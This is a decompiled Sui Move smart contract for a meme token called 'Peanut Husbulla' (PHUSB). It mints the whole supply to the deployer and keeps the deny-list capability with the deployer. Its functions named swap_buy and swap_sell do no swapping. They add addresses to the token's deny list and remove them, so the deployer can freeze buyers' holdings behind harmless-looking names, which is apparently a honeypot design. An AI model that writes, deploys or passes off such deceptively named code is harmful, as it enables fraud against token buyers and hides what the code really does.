module 0x102e7717c750ae0977a56af83bb42b1bf08bbdafb2b2c51447a3f5b44b409558::phusb {
    struct PHUSB has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PHUSB, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PHUSB>(arg0, 9, b"PHUSB", b"Peanut Husbulla", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmNSNoLPL8f4oWPEpj4fWkmA2iMCzcjKGjYiHHAqHr2ufj"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PHUSB>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PHUSB>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PHUSB>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PHUSB>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PHUSB>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PHUSB>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PHUSB>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PHUSB>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

